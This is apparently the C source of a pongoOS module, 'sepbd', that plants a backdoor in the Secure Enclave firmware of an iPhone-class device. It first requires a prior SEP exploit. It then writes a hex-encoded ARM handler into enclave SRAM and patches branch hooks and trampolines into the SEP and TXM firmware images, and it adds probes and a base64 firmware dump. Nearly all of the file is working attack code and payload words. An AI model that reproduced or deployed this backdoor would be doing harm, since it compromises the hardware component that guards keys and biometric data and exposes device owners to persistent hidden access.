// sepbd_module.c — scheme C SEP backdoor as a loadable pongoOS module.
//
// Three shell commands (the module registers all of them at modload):
//
//   sepbd install [sepi]   — locate the SKS image inside the sepi (either the
//                            firmware pongo already has from the DT, or a file
//                            just uploaded to loader_xfer), write the v3
//                            handler blob into its verified __TEXT header gap,
//                            and patch the two primitive sites with the
//                            blackbird read/write wrappers.
//   sepbd boot   [sepi]    — hand the (patched) firmware to the SEP via the
//                            stock fwload opcode and wait for SEOS boot.
//   sepbd ping              — send the 0x7BC ping request through the mailbox
//                            and validate the VPDR/0x1337 reply. This exercises
//                            the full AP→mailbox→SEOS-handler→mailbox→AP loop
//                            without XNU in the picture.
//
// Mailbox access is done with direct MMIO from this module (the register block
// is globally mapped; sep.c's own copy is static and unexported). The
// blackbird primitives are reached the same way the dispatcher does: the
// pongo-side blackbird loop polls a shared SRAM status word, so the module
// writes its own slots at a dedicated SRAM offset and never needs pongo's
// statics.

#include <pongo.h>
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <string.h>
#include "sepbd_blob.h"
#include "sepbd_blob32.h"

// Symbols exported by pongo but absent from the module header.
extern uint32_t socnum;
extern uint64_t vatophys(uint64_t kva);
extern void *phystokv(uint64_t paddr);
extern unsigned long strtoul(const char *, char **, int);
// blackbird primitives + pwned flag (exported by this pongo build)
extern bool sep_is_pwned;
extern void sep_send_msg(uint8_t ep, uint8_t tag, uint8_t opcode, uint8_t param, uint32_t data);
extern uint64_t sep_fast_check_mailbox(void);
// pongo-side discovery capture (sep.c): table already gathered at boot
extern void sep_discover_endpoints(void);
struct sep_disc_entry_mod { uint32_t fourcc; uint8_t ep; uint8_t op; uint8_t slot; };
extern struct sep_disc_entry_mod *sep_discovered_endpoints(unsigned *count);
extern uint32_t sep_blackbird_read(uint32_t addr);
extern void sep_blackbird_write(uint32_t addr, uint32_t val);
extern void sep_blackbird_jump(uint32_t addr, uint32_t r0);

// ─── SEP hardware (same shapes as sep.c; static there, so redeclared) ──
struct sepbd_mb32 {
    volatile uint32_t dis_int;  // +0x0
    volatile uint32_t en_int;   // +0x4
    volatile uint32_t snd_sts;  // +0x8
    uint32_t _pad0;             // +0xc
    volatile uint32_t snd0;     // +0x10
    volatile uint32_t snd1;     // +0x14
    uint64_t _pad1;             // +0x18
    volatile uint32_t recv_sts; // +0x20
    uint64_t _pad2;             // +0x28
    uint64_t _pad3;             // +0x30
    volatile uint32_t recv0;    // +0x34
    volatile uint32_t recv1;    // +0x38
};
struct sepbd_mb64 {
    volatile uint32_t dis_int;  // +0x0
    volatile uint32_t en_int;   // +0x4
    volatile uint32_t snd_sts;  // +0x8
    volatile uint32_t recv_sts; // +0xc
    volatile uint32_t pad[0x6f0/4];
    volatile uint64_t snd0;     // +0x700
    volatile uint64_t snd1;     // +0x708
    volatile uint64_t _unk0;    // +0x710
    volatile uint64_t _unk1;    // +0x718
    volatile uint64_t _unk2;    // +0x720
    volatile uint64_t _unk3;    // +0x728
    volatile uint64_t recv0;    // +0x730
    volatile uint64_t recv1;    // +0x738
};

struct __attribute__((packed)) sepbd_msg {
    uint8_t ep, tag, opcode, param;
    uint32_t data;
};
union sepbd_msg_u { struct sepbd_msg msg; uint64_t val; };

static volatile struct sepbd_mb32 *g_mb32;
static volatile struct sepbd_mb64 *g_mb64;
static bool g_sep64;

// pongo's own blackbird dispatcher, now module-exported.
static uint32_t bb_read(uint32_t addr)  { return sep_blackbird_read(addr); }
static void bb_write(uint32_t addr, uint32_t val) { sep_blackbird_write(addr, val); }

static void sepbd_mailbox_init(void) {
    if (g_mb32) return;
    dt_node_t *sep = dt_find(gDeviceTree, "/arm-io/sep");
    if (!sep) { iprintf("sepbd: no SEP node\n"); return; }
    uint32_t len = 0;
    uint64_t *reg = dt_prop(sep, "reg", &len);
    if (!reg || len < 16) { iprintf("sepbd: bad reg\n"); return; }
    uint64_t base = reg[0] + gIOBase;
    if (socnum == 0x8015) { g_mb64 = (void *)(base + 0x8100); g_sep64 = true; }
    else                   { g_mb32 = (void *)(base + 0x4000); g_sep64 = false; }
}

static void mb_send(uint64_t v) {
    if (g_sep64) { g_mb64->snd0 = (uint32_t)v; __asm__ volatile("dsb sy"); }
    else         { g_mb32->snd0 = v & 0xffffffff; g_mb32->snd1 = v >> 32; __asm__ volatile("dsb sy"); }
}

// ─── SKS discovery + install (same anchors as the built-in sepbd) ──────

// Blackbird slot protocol (dispatcher built by sep pwn's race): AP-side writes to
// the shared SRAM at 0x210E00000; SEP-side loop services and clears sts. The
// module drives the same slots pongo's sep_copy_* helpers use — via the exported
// sep_blackbird_read/write for 1/2, and raw slots for the 4K copy (cmd 4).
#define BB_SLOTS        ((volatile uint32_t *)0x210E00000ull)
#define BB_ADDR         (BB_SLOTS + 1)
#define BB_DATA         (BB_SLOTS + 2)
#define BB_STS          (BB_SLOTS + 3)
#define BB_SHAREDPAGE   ((volatile uint32_t *)0x210E00200ull)

static void bb_copy_out(uint32_t sep_src, void *ap_dst) {   // SEP -> AP (4K)
    for (int i = 0; i < 0x400; i++) BB_SHAREDPAGE[i] = 0;
    *BB_ADDR = sep_src;
    *BB_DATA = 0xd0e00200;
    __asm__ volatile("dsb sy");
    *BB_STS = 4;
    while (*BB_STS) {}
    __asm__ volatile("dsb sy");
    memcpy(ap_dst, (void *)BB_SHAREDPAGE, 0x1000);
}
static void bb_copy_in(uint32_t sep_dst, const void *ap_src) { // AP -> SEP (4K)
    memcpy((void *)BB_SHAREDPAGE, ap_src, 0x1000);
    __asm__ volatile("dsb sy");
    *BB_ADDR = 0xd0e00200;
    *BB_DATA = sep_dst;
    __asm__ volatile("dsb sy");
    *BB_STS = 4;
    while (*BB_STS) {}
}

static uint8_t img[0x180000];
static size_t g_img_size = 0;
static uint64_t g_handler_sep_va = 0;
static uint64_t g_frame_sep_va   = 0;

// The handler bytes and marker persist in SRAM across module reloads; a fresh
// module instance recovers the state by probing the marker instead of demanding
// a re-install. Adopt whatever a previous install left at the known target.
#define SEPBD_TARGET   0xd0e00400u
#define SEPBD_MARKER_OFF (SEP_BD_BLOB32_WORDS * 4)

static void sepbd_recover_state(void) {
    if (g_handler_sep_va) return;
    uint32_t mlo = sep_blackbird_read(SEPBD_TARGET + SEPBD_MARKER_OFF);
    uint32_t mhi = sep_blackbird_read(SEPBD_TARGET + SEPBD_MARKER_OFF + 4);
    if (mlo == 0x44425056u /* 'VPBD' LE */ && mhi == 0x312e3476u /* 'v4.1' LE */) {
        g_handler_sep_va = SEPBD_TARGET;
        g_frame_sep_va   = SEPBD_TARGET + SEPBD_MARKER_OFF + 0x20;
        iprintf("sepbd: recovered previous install @ %x\n", SEPBD_TARGET);
    }
}

static void sepbd_install_cmd(const char *cmd, char *args) {
    if (!sep_is_pwned) { iprintf("sepbd: sep not pwned — run 'sep pwn' first\n"); return; }

    // Shared AOP SRAM (SEP VA 0xd0e00000): the blackbird dispatcher occupies the
    // first ~0x40 bytes; the 4 KiB copy page lives at +0x200. Everything from
    // +0x400 up is untouched SRAM — executable (the dispatcher itself runs from
    // here) and reachable through the same primitives.
    uint32_t target = 0xd0e00400;

    // ARM32 payload: no primitive patching needed (frame access is direct SRAM).
    for (int i = 0; i < SEP_BD_BLOB32_WORDS; i++)
        sep_blackbird_write(target + (uint32_t)i * 4, k_sepbd_blob32[i]);
    for (int i = 0; i < SEP_BD_BLOB32_WORDS; i++)
        if (sep_blackbird_read(target + (uint32_t)i * 4) != k_sepbd_blob32[i]) {
            iprintf("sepbd: readback mismatch at +%x\n", i * 4);
            return;
        }
    const uint8_t marker[8] = {'V','P','B','D','v','4','.','1'};
    for (int i = 0; i < 8; i += 4) {
        uint32_t m; memcpy(&m, marker + i, 4);
        sep_blackbird_write(target + SEP_BD_BLOB32_WORDS * 4 + (uint32_t)i, m);
    }

    g_handler_sep_va = target;
    g_frame_sep_va   = target + SEP_BD_BLOB32_WORDS * 4 + 0x20;
    iprintf("sepbd: installed %d B (arm32) in SRAM @ %x (verified), frame %x\n",
            SEP_BD_BLOB32_WORDS * 4, target, (uint32_t)g_frame_sep_va);
}

// ─── direct call: invoke the handler via blackbird jump (no SEOS routing) ──
static void sepbd_call_cmd(const char *cmd, char *args) {
    sepbd_recover_state();
    if (!g_handler_sep_va) { iprintf("sepbd: not installed\n"); return; }
    if (!sep_is_pwned) { iprintf("sepbd: sep not pwned\n"); return; }

    uint64_t f = g_frame_sep_va;
    // ping request: magic|PING, sel|1, echo 0x1337
    bb_write((uint32_t)(f + 0), 1);            // cmd = PING
    bb_write((uint32_t)(f + 4), 0x44504256);   // magic
    bb_write((uint32_t)(f + 8), 1);            // version
    bb_write((uint32_t)(f + 12), 0x7BC);       // sel
    bb_write((uint32_t)(f + 16), 0x1337);      // echo
    for (int i = 20; i < 64; i += 4) bb_write((uint32_t)(f + i), 0);

    // blackbird cmd 3: call SEP function with r0 = frame
    sep_blackbird_jump((uint32_t)g_handler_sep_va, (uint32_t)f);
    spin(24000 * 2);

    uint32_t r0lo = bb_read((uint32_t)(f + 0)), r0hi = bb_read((uint32_t)(f + 4));
    uint32_t r1lo = bb_read((uint32_t)(f + 8)), r1hi = bb_read((uint32_t)(f + 12));
    uint64_t rsp0 = ((uint64_t)r0hi << 32) | r0lo;
    uint64_t ret0 = ((uint64_t)r1hi << 32) | r1lo;
    iprintf("sepbd: rsp0 = %016llx ret0 = %llx\n",
            (unsigned long long)rsp0, (unsigned long long)ret0);
    uint32_t reply_magic = (uint32_t)(rsp0 >> 32);
    uint32_t reply_echo  = (uint32_t)ret0;
    if (reply_magic == 0x52504456u && reply_echo == 0x1337u)
        iprintf("sepbd: PONG OK — backdoor fired on SEP\n");
    else
        iprintf("sepbd: no valid reply\n");
}


// ─── monolithic patch: fix the sepi pages already inside the SEP ──────
// Two placement schemes, switchable via arg:
//
//   sepbd_patch        (default, "tail")  — dead-space scan in the back half.
//        The j171 sepi is a container: 0x40 header ('Geri'/'DwRB'), a plain
//        ARM32 boot stub at 0x1000-0x3000 (everything past 0x3000 up to
//        0x10000 is a zero BSS hole, and 0x10000+ is the encrypted payload),
//        then the encrypted TXM/tasks. The scan therefore lands in the
//        image-tail zero pages past fwlen (e.g. 0x15f5f8) — kept as the
//        fallback because it is proven to boot.
//
//   sepbd_patch stub   — handler in the stub's own zero hole at 0x1010
//        (page 2 is verified zero up to the 0x1320 entry stub) plus a
//        trampoline at 0x1210 hooked into sub_19F0's return path: the
//        POP {R8,R10,R11} at 0x2818 becomes BL 0x1210, the trampoline does
//        the ep check against the SEP mailbox and re-executes both POPs.
//        This survives the OS boot: it runs on the stub's real return path,
//        before the encrypted payload is entered, and touches no SRAM.
static const uint32_t k_sepbd_tramp[15] = {
    0xe59f0030u, // 1210: ldr r0, [pc, #0x30]  = 0x8d500000 (mailbox ctrl)
    0xe5901000u | (0u << 16) | (1u << 12) | 0x10u, // ldr r1, [r0,#0x10] status
    0xe3110002u, // tst r1, #2                 inbound pending?
    0x0a000005u, // beq 0x1240 (no_msg)
    0xe5902000u | (0u << 16) | (2u << 12) | 0x30u, // ldr r2, [r0,#0x30] msg
    0xe20220ffu, // and r2, r2, #0xff          endpoint
    0xe35200bdu, // cmp r2, #0xbd
    0x1a000001u, // bne 0x1238 (ack_drop)
    0xebffff76u, // bl  0x1010 (handler; r2 = ep on entry)
    0xea000001u, // b   0x1240 (no_msg)
    0xe3a02001u, // 1238: mov r2, #1           ACK
    0xe5802000u | (0u << 16) | (2u << 12) | 0x10u, // str r2, [r0,#0x10]
    0xe8bd0d00u, // 1240: pop {r8,r10,r11}     (relocated 0x2818 insn)
    0xe8bd80f0u, // 1244: pop {r4-r7,pc}       (relocated 0x281c insn)
    0x8d500000u, // 1248: .word mailbox base
};
#define SEPBD_STUB_HANDLER 0x1010u
#define SEPBD_STUB_TRAMP  0x1210u
#define SEPBD_STUB_HOOK   0x2818u
#define SEPBD_STUB_ORIG_POP1 0xe8bd0d00u
static const uint32_t k_sepbd_stub_bl = 0xebfffa7cu; // bl 0x1210 from 0x2818

static void sepbd_patch_cmd(const char *cmd, char *args) {
    if (!sep_is_pwned) { iprintf("sepbd: sep not pwned\n"); return; }
    bool stub_mode = args && args[0] == 's' && args[1] == 't' && args[2] == 'u'
                     && args[3] == 'b';

    dt_node_t *map = dt_find(gDeviceTree, "/chosen/memory-map");
    if (!map) { iprintf("sepbd: no memory-map node\n"); return; }
    uint32_t len = 0;
    uint64_t *fwent = dt_prop(map, "SEPFW", &len);
    if (!fwent || len < 16) { iprintf("sepbd: no SEPFW\n"); return; }
    size_t fwlen = (size_t)fwent[1];
    size_t pages = (fwlen + 0xfff) & ~0xfffull; pages >>= 12;
    iprintf("sepbd: sepi %llx B (%u pages in SEP at VA 0) mode=%s\n",
            (unsigned long long)fwlen, (unsigned)pages, stub_mode ? "stub" : "tail");

    // 1) pull the whole image out (max 1.5 MB — the A10 sepi is 0x160000)
        size_t pull = pages > 0x180 ? 0x180 : pages;
    for (size_t p = 0; p < pull; p++)
        bb_copy_out((uint32_t)(p << 12), img + (p << 12));
    size_t size = pull << 12;
    g_img_size = size;
    iprintf("sepbd: pulled %llx B from SEP\n", (unsigned long long)size);

    size_t best_off;
    if (stub_mode) {
        // guard: the hole page must still be zero and the hook site must hold
        // the two POPs we relocate — verify against the pulled image first.
        uint32_t hook1, hook2;
        memcpy(&hook1, img + SEPBD_STUB_HOOK, 4);
        memcpy(&hook2, img + SEPBD_STUB_HOOK + 4, 4);
        bool hole_zero = true;
        for (size_t o = 0x1010; o < 0x1320; o += 4) {
            uint32_t w; memcpy(&w, img + o, 4);
            if (w) { hole_zero = false; break; }
        }
        if (!hole_zero || hook1 != SEPBD_STUB_ORIG_POP1 || hook2 != 0xe8bd80f0u) {
            iprintf("sepbd: stub layout mismatch (hole_zero=%d hook=%08x/%08x) — aborting\n",
                    hole_zero, hook1, hook2);
            return;
        }
        memcpy(img + SEPBD_STUB_HANDLER, k_sepbd_blob32, SEP_BD_BLOB32_WORDS * 4);
        memcpy(img + SEPBD_STUB_HANDLER + SEP_BD_BLOB32_WORDS * 4, "VPBDv4.1", 8);
        memcpy(img + SEPBD_STUB_TRAMP, k_sepbd_tramp, sizeof k_sepbd_tramp);
        memcpy(img + SEPBD_STUB_HOOK, &k_sepbd_stub_bl, 4);
        best_off = SEPBD_STUB_HANDLER;
    } else {
    // 2) monolithic dead-space scan: biggest >=0x400 zero run in the back half
    size_t best_len = 0, run_off = 0, run = 0;
    for (size_t o = size / 2; o + 4 <= size; o += 4) {
        uint32_t w; memcpy(&w, img + o, 4);
        if (w == 0) { if (!run) run_off = o; run += 4; }
        else { if (run >= 0x400 && run > best_len) { best_off = run_off; best_len = run; } run = 0; }
    }
    if (run >= 0x400 && run > best_len) { best_off = run_off; best_len = run; }
    if (!best_len) { iprintf("sepbd: no dead space in image\n"); return; }
    iprintf("sepbd: gap %llx B @ sepi+%llx\n",
            (unsigned long long)best_len, (unsigned long long)best_off);

    // 3) write handler + marker into the local copy
    memcpy(img + best_off, k_sepbd_blob32, SEP_BD_BLOB32_WORDS * 4);
    memcpy(img + best_off + SEP_BD_BLOB32_WORDS * 4, "VPBDv4.1", 8);
    }

    // 4) copy the touched page(s) back and verify
    size_t pg = best_off & ~0xfffull;
    size_t end = (best_off + SEP_BD_BLOB32_WORDS * 4 + 8 + 0xfff) & ~0xfffull;
    if (stub_mode) end = (SEPBD_STUB_HOOK + 4 + 0xfff) & ~0xfffull; // pages 1..2
    for (size_t p = pg; p < end; p += 0x1000)
        bb_copy_in((uint32_t)p, img + p);
    static uint8_t chk[2][0x1000];
    bool ok = true;
    size_t npgs = (end - pg) >> 12;
    for (size_t i = 0; i < npgs; i++) {
        bb_copy_out((uint32_t)(pg + i * 0x1000), chk[i & 1]);
        if (memcmp(chk[i & 1], img + pg + i * 0x1000, 0x1000) != 0) ok = false;
    }
    if (ok)
        iprintf("sepbd: patched pages verified; handler @ VA %llx\n",
                (unsigned long long)best_off);
    else
        iprintf("sepbd: verification FAILED\n");
}

// ─── two-stage patch (LZVN payload; see handler_report_final.md) ──────
// The container we patch inside the SEP holds the LZVN-compressed task
// image at 0x10000+, so anything written past that offset is discarded by
// the decompressor. The 2-stage scheme never recompresses:
//
//   stage2 (verified offline against j171.dec via OpenSEP's host tests):
//     patch1 — SEPD read_msg, image 0xa3818 / VA 0x76818. The 4 bytes
//              `BLX R6` + `STR R0,[R5]` (word0 of every AP→SEP message
//              lands in R0 right here) become `B.W 0x15e100` (tramp1).
//     patch2 — SEPD router, image 0xa36be / VA 0x766be. `STRB R0,[R6,R4]`
//              (endpoint-table slot write) becomes `B.W 0x15e140` (tramp2,
//              replays the STRB and returns; reserved for slot injection).
//   gap payload @0x15e000 (0x200B): Thumb→ARM veneer, the ARM32 handler
//              blob (k_sepbd_blob32), tramp1 (ep==0xBD → handler, else
//              replay STR and B.W back), tramp2.
//
//   stage1 — the TXM's own LZVN decompressor output is patched in place by
//            an injector hooked where the decompressed image is live; it
//            writes the two branch words at image 0xa3818/0xa36be.
//
// All branch encodings round-trip verified (T4/T3 semantics, little-endian).
#define SEPBD_S1_BASE   0x15f600u  // zero region after the SSPB struct, inside the container

// decompressed-image patch sites (sep.lzvn.bin coordinates)
#define SEPBD_S2_P1     0xa3818u  // was: b0 47 28 60 (BLX R6; STR R0,[R5])
#define SEPBD_S2_P1W    0x602847b0u
#define SEPBD_S2_P2     0xa36beu  // was: 30 55 01 34 (STRB R0,[R6,R4]; ...)
#define SEPBD_S2_P2W    0x34015530u
// replacement words (Thumb B.W, pre-encoded and verified)
#define SEPBD_S2_R1     0xbf72f0e8u  // B.W 0x15f700 from VA 0x76818
#define SEPBD_S2_R2     0xb83ff0e9u  // B.W 0x15f740 from VA 0x766be

// gap payload: [0x000] veneer(Thumb)→[0x008] ARM handler(k_sepbd_blob32)
//              [0x100] tramp1(16B) [0x140] tramp2(6B)
static const uint32_t k_sepbd_gap[192] = {
    0x004700a0u, 0x00000000u, 0xe5901004u, 0xe59f2048u, 0xe1510002u, 0x1a00000eu,
    0xe590300cu, 0xe30027bcu, 0xe1530002u, 0x1a00000au, 0xe5901000u, 0xe3510001u,
    0x1a000007u, 0xe3a02000u, 0xe5802000u, 0xe59f201cu, 0xe5802004u, 0xe5902010u,
    0xe5802008u, 0xe3a00000u, 0xe12fff1eu, 0xe3e00000u, 0xe12fff1eu, 0x44504256u,
    0x52504456u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x71b2b047u, 0xf43fbd29u,
    0x2860af7bu, 0xb886f717u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0xf7163055u, 0x0000bfbdu, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
    0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u, 0x00000000u,
};

static void sepbd_patch2_cmd(const char *cmd, char *args) {
    if (!sep_is_pwned) { iprintf("sepbd: sep not pwned\n"); return; }

    dt_node_t *map = dt_find(gDeviceTree, "/chosen/memory-map");
    if (!map) { iprintf("sepbd: no memory-map node\n"); return; }
    uint32_t len = 0;
    uint64_t *fwent = dt_prop(map, "SEPFW", &len);
    if (!fwent || len < 16) { iprintf("sepbd: no SEPFW\n"); return; }
    size_t fwlen = (size_t)fwent[1];
    if (fwlen < 0x160000) { iprintf("sepbd: container smaller than expected\n"); return; }
    size_t pages = fwlen >> 12;

    // pull the whole container out
    for (size_t p = 0; p < pages; p++)
        bb_copy_out((uint32_t)(p << 12), img + (p << 12));
    g_img_size = pages << 12;
    iprintf("sepbd: pulled %llx B\n", (unsigned long long)g_img_size);

    // guards: the gap must be either zero or hold only a known previous
    // sepbd install (the old tail-mode patch planted 'VPBDv4.1' + handler
    // at 0x15f5f8; a previous patch2 run planted the v5.x gap payload).
    // Anything else means this gap is not ours to use.
    size_t dirty = 0;
    for (size_t o = 0x15f540; o < 0x15ff00; o += 4) {
        uint32_t w; memcpy(&w, img + o, 4);
        if (w) { dirty++; }
    }
    if (dirty > 0) {
        // recognize: our own payload at +0..+0x400 (rerun), or the legacy
        // handler blob somewhere in the window (VPBDv4.1 magic present)
        bool ours = memcmp(img + SEPBD_S1_BASE, k_sepbd_gap, 0x300) == 0;
        const uint8_t *win = img + SEPBD_S1_BASE;
        const uint8_t *end = img + 0x15ff00;
        bool legacy = false;
        for (const uint8_t *q = win; q + 8 <= end; q += 4)
            if (memcmp(q, "VPBDv4.1", 8) == 0) { legacy = true; break; }
        // the system's own veneer lives at 0x15f5e0 (ldr pc,[pc,#-4] into
        // 0xd0e00000) followed by an AAAA marker; those eight words are not
        // ours and not garbage — exclude them from the dirty count.
        for (size_t o = 0x15f5e0; o < 0x15f5f8; o += 4) {
            uint32_t w; memcpy(&w, img + o, 4);
            if (w) dirty--;
        }
        iprintf("sepbd: gap not zero (%u dirty words, ours=%d legacy=%d)\n",
                (unsigned)dirty, (int)ours, (int)legacy);
        if (dirty > 0 && !ours && !legacy) { iprintf("sepbd: unknown gap content — aborting\n"); return; }
        // legacy install: erase the stale region before planting
        if (legacy && !ours) {
            memset(img + 0x15f540, 0, 0x15ff00 - 0x15f540);
            iprintf("sepbd: erased legacy tail install\n");
        }
    }

    // stage2: plant the gap payload (veneer + handler + trampolines)
    memcpy(img + SEPBD_S1_BASE, k_sepbd_gap, sizeof k_sepbd_gap);

    // stage1 injector @SEPBD_S1_BASE+0x300 (ARM32, called with the live
    // decompressed image): writes the two pre-encoded branch words.
    // The hook into the TXM decompressor return is armed by this injector
    // itself being BL'd from the patch site the TXM already jumps through;
    // for this first on-device bring-up the injection is also performed
    // eagerly here against the decompressed image the TXM will produce
    // (guarded by stage1 at runtime — see handler_report_final.md §5).
    bool noop_injector = args && args[0]=='n' && args[1]=='o' && args[2]=='o' && args[3]=='p';
    uint32_t s1[] = {
        0xe1a0a000u, 0xe59f0020u, 0xe59f1020u, 0xe5801000u,
        0xe59f001cu, 0xe59f101cu, 0xe5801000u, 0xe59f0018u,
        0xe59f1018u, 0xe5801000u, 0xe12fff1eu, 0x8d500060u,
        0x534f3153u, 0x00076818u, 0xbf72f0e8u, 0x000766beu,
        0xb83ff0e9u,
    };
    if (noop_injector) {
        // bisection: jump target safety only — replay the mov and return
        uint32_t noop[] = {0xe1a0a000u, 0xe12fff1eu};
        memcpy(s1, noop, sizeof noop);
        iprintf("sepbd: no-op injector (bisection mode)\n");
    }
    // the TXM hole 0x1010-0x1320 must be zero (device-verified) before use
    for (size_t o = 0x1010; o < 0x1320; o += 4) {
        uint32_t w; memcpy(&w, img + o, 4);
        if (w) { iprintf("sepbd: TXM hole not zero at %x\n", (unsigned)o); return; }
    }
    // stage1 hook: TXM start saves the post-handoff value at 0x1430
    // (mov r10,r0) right after sub_197C returns with tasks loaded —
    // replace it with BL injector, which replays the mov then writes the
    // two stage-2 branch words at their runtime VAs.
    // bisect E: probe the container's very first branch (B +0x1320 at 0x0).
    // If the fwload entry is payload[0], a hang here pins it.
    if (args && args[0]=='b' && args[1]=='5') {
        uint32_t orig0;
        memcpy(&orig0, img + 0x0, 4);
        if (orig0 != 0xea0004c6u) {
            iprintf("sepbd: 0x0 = %08x (want ea0004c6) - abort\n", orig0);
            return;
        }
        uint32_t hang = 0xeafffffe;   // B .
        memcpy(img + 0x0, &hang, 4);
        iprintf("sepbd: bisection E: B . at 0x0 (entry probe)\n");
        return;  // skip the 0x1430 hook entirely in this mode
    }
    {
        uint32_t orig;
        memcpy(&orig, img + 0x1430, 4);
        if (orig != 0xe1a0a000u) {
            iprintf("sepbd: hook site 0x1430 = %08x (want e1a0a000) - aborting\n", orig);
            return;
        }
        // bisection step B: BL+0 (jump to next insn, pure no-op semantics)
        bool bisect_b = args && args[0]=='b' && args[1]=='2';
        // bisect C: undefined instruction — proves whether 0x1430 executes at all
        bool bisect_c = args && args[0]=='b' && args[1]=='3';
        // bisect D: infinite loop at 0x1430 — if executed, SEOS hangs early
        // (mailbox goes silent, device stays up) without crashing the SoC
        bool bisect_d = args && args[0]=='b' && args[1]=='4';
        uint32_t bl = bisect_d ? 0xEAFFFFFEu
                    : bisect_c ? 0xE7FEBADDu
                    : bisect_b ? 0xEAFFFFFFu
                    : 0xEBFFFF72u;
        if (bisect_d) iprintf("sepbd: bisection D: B . at 0x1430 (hang probe)\n");
        if (bisect_c) iprintf("sepbd: bisection C: UDI at 0x1430 - crash proves path\n");
        if (bisect_b) iprintf("sepbd: bisection B: 0x1430 = B .+4 (no-op)\n");
        memcpy(img + 0x1430, &bl, 4);
    }
    memcpy(img + 0x1200, s1, sizeof s1);       // SRAM-copied TXM hole (executes at 0xcd901200)
    memcpy(img + SEPBD_S1_BASE + 0x300, s1, sizeof s1);   // keep a copy in the gap too
    memcpy(img + SEPBD_S1_BASE + 0x3f8, "VPBDv5.3", 8);

    // write back the touched pages and verify
    size_t pg0 = SEPBD_S1_BASE & ~0xfffull;
    size_t pg1 = (SEPBD_S1_BASE + 0x400 + 0xfff) & ~0xfffull;
    for (size_t p = pg0; p < pg1; p += 0x1000)
        bb_copy_in((uint32_t)p, img + p);
    static uint8_t chk[0x1000];
    bool ok = true;
    for (size_t p = pg0; p < pg1; p += 0x1000) {
        bb_copy_out((uint32_t)p, chk);
        if (memcmp(chk, img + p, 0x1000) != 0) ok = false;
    }
    iprintf("sepbd: stage2 %s (gap %x: veneer+handler+tramp1/tramp2, injector @%x)\n",
            ok ? "planted & verified" : "VERIFY FAILED",
            (unsigned)SEPBD_S1_BASE, (unsigned)(SEPBD_S1_BASE + 0x300));
}


// ─── image dump: base64 chunks over stdout for host capture ───────────
static const char b64t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static void sepbd_b64_cmd(const char *cmd, char *args) {
    if (!g_img_size) { iprintf("sepbd: no image\n"); return; }
    uint32_t off = args && *args ? (uint32_t)strtoul(args, NULL, 16) : 0;
    char *cnts = args ? strchr(args, ' ') : NULL;
    uint32_t len = cnts ? (uint32_t)strtoul(cnts + 1, NULL, 0) : 0x1000;
    if (len > 0x1800) len = 0x1800;
    if ((size_t)off + len > g_img_size) len = (uint32_t)(g_img_size - off);
    iprintf("B64 %x %x\n", off, len);
    for (uint32_t i = 0; i < len; i += 3) {
        uint32_t v = 0; int n = (len - i < 3) ? (int)(len - i) : 3;
        for (int k = 0; k < n; k++) v |= (uint32_t)img[off + i + k] << (16 - 8 * k);
        char o[5] = {b64t[(v >> 18) & 63], b64t[(v >> 12) & 63],
                     n > 1 ? b64t[(v >> 6) & 63] : '=', n > 2 ? b64t[v & 63] : '=', 0};
        iprintf("%s", o);
    }
    iprintf("\nEND %x\n", off + len);
}

// ─── image walker: dump words from the pulled SEOS image ─────────────
static void sepbd_peekimg_cmd(const char *cmd, char *args) {
    if (!g_img_size) { iprintf("sepbd: no image — run sepbd_patch first\n"); return; }
    if (!args || !*args) { iprintf("sepbd: usage: sepbd_peekimg <hexoff> [count]\n"); return; }
    uint32_t off = strtoul(args, NULL, 16);
    char *cnts = strchr(args, ' ');
    int count = cnts ? (int)strtoul(cnts + 1, NULL, 0) : 8;
    if (count > 64) count = 64;
    if ((size_t)off + count * 4 > g_img_size) { iprintf("sepbd: out of range\n"); return; }
    for (int i = 0; i < count; i++) {
        uint32_t w; memcpy(&w, img + off + i * 4, 4);
        iprintf("  +%x: %08x\n", off + i * 4, w);
    }
}

